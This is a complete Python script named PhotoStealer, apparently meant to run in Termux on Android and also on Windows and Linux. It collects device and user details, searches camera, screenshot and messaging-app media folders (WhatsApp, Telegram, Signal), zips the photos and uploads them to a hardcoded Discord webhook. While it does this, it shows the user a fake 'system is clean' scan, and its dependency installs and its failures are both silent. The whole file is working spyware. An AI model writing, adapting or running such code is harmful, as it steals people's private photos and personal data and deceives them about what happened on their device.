#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import platform
import socket
import getpass
from pathlib import Path
import json
import zipfile
import tempfile
import threading
from datetime import datetime
import requests
import time
import random

# Verificar e instalar dependências silenciosamente
try:
    from rich.console import Console
    from rich.progress import Progress
    from rich.panel import Panel
    from rich.table import Table
except ImportError:
    os.system("pip install rich requests > /dev/null 2>&1")
    from rich.console import Console
    from rich.progress import Progress
    from rich.panel import Panel
    from rich.table import Table

# Configurar console para modo silencioso
console = Console(quiet=True)

class PhotoStealer:
    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url
        self.system_info = self.get_system_info()
        self.found_photos = []
        self.max_file_size = 25 * 1024 * 1024  # 25MB limite do Discord
        self.temp_dir = tempfile.mkdtemp()
        self.silent_mode = True  # Modo silencioso ativado
        
    def get_system_info(self) -> dict:
        """Coleta informações do sistema silenciosamente"""
        try:
            hostname = socket.gethostname()
            username = getpass.getuser()
            
            system_info = {
                "system": platform.system(),
                "node": hostname,
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "username": username,
                "timestamp": datetime.now().isoformat()
            }
            
            # Detecção específica do Termux
            if "com.termux" in sys.executable or "TERMUX_VERSION" in os.environ:
                system_info["environment"] = "Termux"
                # Adicionar informações específicas do Android
                try:
                    import subprocess
                    android_version = subprocess.check_output(["getprop", "ro.build.version.release"]).decode().strip()
                    device_model = subprocess.check_output(["getprop", "ro.product.model"]).decode().strip()
                    system_info["android_version"] = android_version
                    system_info["device_model"] = device_model
                except:
                    pass
            elif system_info["system"] == "Linux":
                system_info["environment"] = "Linux"
            elif system_info["system"] == "Windows":
                system_info["environment"] = "Windows"
            else:
                system_info["environment"] = "Other"
                
            return system_info
        except Exception as e:
            return {"error": str(e)}

    def get_termux_storage_paths(self) -> list:
        """Obtém caminhos de storage do Termux de forma mais confiável"""
        paths = []
        
        # Método 1: Verificar storage interno do Termux
        termux_storage = Path.home() / "storage"
        if termux_storage.exists():
            for item in termux_storage.iterdir():
                if item.is_dir():
                    paths.append(str(item))
                    
                    # Adicionar subdiretórios comuns de mídia
                    subdirs = ["DCIM", "Pictures", "Download", "Movies", "Music", "Documents"]
                    for subdir in subdirs:
                        subdir_path = item / subdir
                        if subdir_path.exists():
                            paths.append(str(subdir_path))
        
        # Método 2: Caminhos diretos do Android
        android_paths = [
            "/storage/emulated/0",
            "/sdcard",
            "/storage/sdcard0",
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/Pictures", 
            "/storage/emulated/0/Download",
            "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
            "/storage/emulated/0/Telegram/Telegram Images",
            "/storage/emulated/0/Signal/Media/Signal Photos",
            "/storage/emulated/0/Instagram",
            "/storage/emulated/0/Screenshots",
            "/storage/emulated/0/Camera",
            "/storage/emulated/0/DCIM/Camera",
            "/storage/emulated/0/Pictures/Screenshots",
            "/storage/emulated/0/Pictures/Instagram",
            "/storage/emulated/0/Pictures/Messenger",
            "/storage/emulated/0/Android/media",
        ]
        
        for path in android_paths:
            if os.path.exists(path):
                paths.append(path)
        
        # Método 3: Tentar encontrar através de variáveis de ambiente
        env_paths = [
            os.environ.get("EXTERNAL_STORAGE", ""),
            os.environ.get("SECONDARY_STORAGE", ""),
            os.environ.get("EMULATED_STORAGE_SOURCE", ""),
        ]
        
        for env_path in env_paths:
            if env_path and os.path.exists(env_path):
                paths.append(env_path)
                
        # Remover duplicados e ordenar
        paths = list(dict.fromkeys(paths))
        return paths

    def get_photo_paths(self) -> list:
        """Retorna os caminhos onde procurar fotos baseado no SO"""
        system = self.system_info.get("environment", "Unknown")
        
        if system == "Termux":
            paths = self.get_termux_storage_paths()
        elif system == "Windows":
            user_profile = os.environ.get("USERPROFILE", "")
            paths = [
                str(Path(user_profile) / "Pictures"),
                str(Path(user_profile) / "Downloads"),
                str(Path(user_profile) / "Documents"),
                str(Path(user_profile) / "OneDrive" / "Pictures"),
                str(Path(user_profile) / "AppData" / "Local" / "Packages"),
                "C:\\Users\\Public\\Pictures",
                str(Path(user_profile) / "Pictures" / "Camera Roll"),
                str(Path(user_profile) / "Pictures" / "Screenshots"),
            ]
        elif system == "Linux":
            home = str(Path.home())
            paths = [
                f"{home}/Pictures",
                f"{home}/Downloads",
                f"{home}/Documents",
                f"{home}/Desktop",
                "/usr/share/wallpapers",
                f"{home}/.local/share/backgrounds",
                f"{home}/Images",
                f"{home}/photos",
            ]
        else:
            paths = []
        
        # Filtrar apenas caminhos que existem
        valid_paths = [p for p in paths if os.path.exists(p)]
        
        # Log para debug (remover em produção)
        debug_info = {
            "system": system,
            "all_paths": paths,
            "valid_paths": valid_paths
        }
        
        return valid_paths

    def is_photo_file(self, filename: str) -> bool:
        """Verifica se o arquivo é uma foto"""
        photo_extensions = {
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif',
            '.webp', '.raw', '.cr2', '.nef', '.arw', '.svg', '.heic',
            '.jpe', '.jif', '.jfif', '.pjpeg', '.pjp'
        }
        return Path(filename).suffix.lower() in photo_extensions

    def find_photos(self, max_photos: int = 200) -> list:
        """Encontra fotos nos diretórios do sistema silenciosamente"""
        photo_paths = self.get_photo_paths()
        found_photos = []
        
        if not photo_paths:
            return found_photos
        
        for photo_dir in photo_paths:
            try:
                if not os.path.exists(photo_dir) or not os.path.isdir(photo_dir):
                    continue
                    
                for root, dirs, files in os.walk(photo_dir):
                    for file in files:
                        if len(found_photos) >= max_photos:
                            break
                            
                        if self.is_photo_file(file):
                            full_path = os.path.join(root, file)
                            try:
                                file_size = os.path.getsize(full_path)
                                if file_size <= self.max_file_size and file_size > 1024:
                                    found_photos.append({
                                        'path': full_path,
                                        'size': file_size,
                                        'name': file,
                                        'directory': root
                                    })
                            except (OSError, PermissionError):
                                continue
                    
                    if len(found_photos) >= max_photos:
                        break
                        
            except (PermissionError, OSError) as e:
                continue
            except Exception as e:
                continue
                
            if len(found_photos) >= max_photos:
                break
        
        self.found_photos = found_photos
        return found_photos

    def create_info_file(self) -> str:
        """Cria arquivo com informações do sistema e lista de fotos"""
        info = {
            "system_info": self.system_info,
            "photo_count": len(self.found_photos),
            "photos_found": [
                {
                    "path": photo['path'],
                    "size": photo['size'],
                    "name": photo['name'],
                    "directory": photo.get('directory', '')
                } for photo in self.found_photos[:50]  # Limita a 50 no relatório
            ],
            "scan_time": datetime.now().isoformat(),
            "success": True
        }
        
        info_file = os.path.join(self.temp_dir, "system_info.json")
        try:
            with open(info_file, 'w', encoding='utf-8') as f:
                json.dump(info, f, indent=2, ensure_ascii=False)
            return info_file
        except Exception:
            return None

    def create_photos_zip(self, max_files: int = 50) -> str:
        """Cria um ZIP com as fotos encontradas"""
        if not self.found_photos:
            return None
            
        zip_path = os.path.join(self.temp_dir, "photos.zip")
        files_added = 0
        
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for photo in self.found_photos:
                    if files_added >= max_files:
                        break
                        
                    try:
                        if os.path.exists(photo['path']) and os.path.isfile(photo['path']):
                            # Usa nome relativo no ZIP para evitar paths longos
                            arcname = f"photo_{files_added + 1}_{photo['name']}"
                            zipf.write(photo['path'], arcname)
                            files_added += 1
                    except (OSError, PermissionError):
                        continue
                    except Exception:
                        continue
        except Exception:
            return None
        
        return zip_path if files_added > 0 else None

    def send_to_discord(self, message: str, files: list = None):
        """Envia dados para o webhook do Discord silenciosamente"""
        try:
            payload = {
                "content": message,
                "username": "System Scanner",
                "embeds": [
                    {
                        "title": "📊 System Scan Report",
                        "color": 0x00ff00,
                        "fields": [
                            {
                                "name": "Operating System",
                                "value": f"```{self.system_info.get('environment', 'Unknown')}```",
                                "inline": True
                            },
                            {
                                "name": "Username",
                                "value": f"```{self.system_info.get('username', 'Unknown')}```",
                                "inline": True
                            },
                            {
                                "name": "Files Found",
                                "value": f"```{len(self.found_photos)}```",
                                "inline": True
                            },
                            {
                                "name": "Hostname",
                                "value": f"```{self.system_info.get('node', 'Unknown')}```",
                                "inline": False
                            }
                        ],
                        "timestamp": datetime.now().isoformat()
                    }
                ]
            }
            
            files_dict = {}
            if files:
                for i, file_path in enumerate(files):
                    if file_path and os.path.exists(file_path):
                        try:
                            files_dict[f'file{i}'] = (os.path.basename(file_path), open(file_path, 'rb'))
                        except Exception:
                            continue
            
            if files_dict:
                response = requests.post(self.webhook_url, 
                                       data={"payload_json": json.dumps(payload)},
                                       files=files_dict,
                                       timeout=30)
            else:
                response = requests.post(self.webhook_url, 
                                       json=payload,
                                       timeout=30)
            
            # Fecha os arquivos
            for file_info in files_dict.values():
                try:
                    file_info[1].close()
                except:
                    pass
            
            return response.status_code in [200, 204]
                
        except Exception as e:
            return False

    def cleanup(self):
        """Limpa arquivos temporários"""
        try:
            import shutil
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass

    def show_fake_message(self):
        """Exibe mensagem falsa para o usuário"""
        fake_console = Console()
        fake_console.print("\n[bold blue]🔍 Scanning system for media files...[/bold blue]")
        
        # Simular progresso
        for i in range(5):
            time.sleep(0.3)
            fake_console.print(f"[yellow]Analyzing system directories... {i+1}/5[/yellow]")
        
        fake_console.print("\n[green]✓ System scan completed successfully[/green]")
        fake_console.print("[bold red]❌ No photos or sensitive files found[/bold red]")
        fake_console.print("[blue]📊 Scan Summary: 0 files matching criteria[/blue]")
        fake_console.print("\n[bold green]✅ Your system is clean and secure[/bold green]")

    def run(self, max_photos: int = 200, max_zip_files: int = 50):
        """Executa o stealer completo em modo silencioso"""
        try:
            # Mostrar mensagem falsa primeiro
            if self.silent_mode:
                self.show_fake_message()
            
            # Executar em segundo plano
            def background_task():
                try:
                    # Coletar informações do sistema
                    self.system_info = self.get_system_info()
                    
                    # Buscar fotos
                    photos = self.find_photos(max_photos)
                    
                    # Preparar e enviar relatório
                    info_file = self.create_info_file()
                    zip_file = None
                    
                    if photos:
                        zip_file = self.create_photos_zip(max_zip_files)
                    
                    files_to_send = []
                    if info_file:
                        files_to_send.append(info_file)
                    if zip_file:
                        files_to_send.append(zip_file)
                    
                    # Enviar para Discord
                    message = f"🚨 **SYSTEM SCAN REPORT** 🚨\n"
                    message += f"**OS**: `{self.system_info.get('environment', 'Unknown')}`\n"
                    message += f"**User**: `{self.system_info.get('username', 'Unknown')}`\n"
                    message += f"**Photos Found**: `{len(photos)}`\n"
                    message += f"**Hostname**: `{self.system_info.get('node', 'Unknown')}`\n"
                    
                    # Adicionar informações do Android se disponível
                    if self.system_info.get('android_version'):
                        message += f"**Android**: `{self.system_info.get('android_version')}`\n"
                    if self.system_info.get('device_model'):
                        message += f"**Device**: `{self.system_info.get('device_model')}`\n"
                    
                    message += f"**Time**: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
                    
                    success = self.send_to_discord(message, files_to_send)
                    
                except Exception as e:
                    # Tentar enviar pelo menos as informações básicas em caso de erro
                    try:
                        error_message = f"❌ **SCAN ERROR** ❌\nError: {str(e)}\nSystem: {self.system_info.get('environment', 'Unknown')}"
                        self.send_to_discord(error_message)
                    except:
                        pass
                
                finally:
                    # Limpeza
                    self.cleanup()
            
            # Executar em thread separada
            thread = threading.Thread(target=background_task)
            thread.daemon = True
            thread.start()
            
            # Manter o script rodando brevemente
            time.sleep(3)
            
        except Exception as e:
            self.cleanup()

def main():
    """Função principal - execução automática"""
    
    # Webhook fixo (substitua pelo seu webhook)
    WEBHOOK_URL = "https://discord.com/api/webhooks/1425044577080836228/BpIwVskxVoWoqBAaFxYJI9gVj9s1JGGamhtdC-huBcUrWWufq2-bI1EcX_QAeLfkU7q2"
    
    try:
        # Executar automaticamente
        stealer = PhotoStealer(WEBHOOK_URL)
        stealer.run(max_photos=300, max_zip_files=100)
    except Exception as e:
        # Falha silenciosa
        pass

if __name__ == "__main__":
    main()
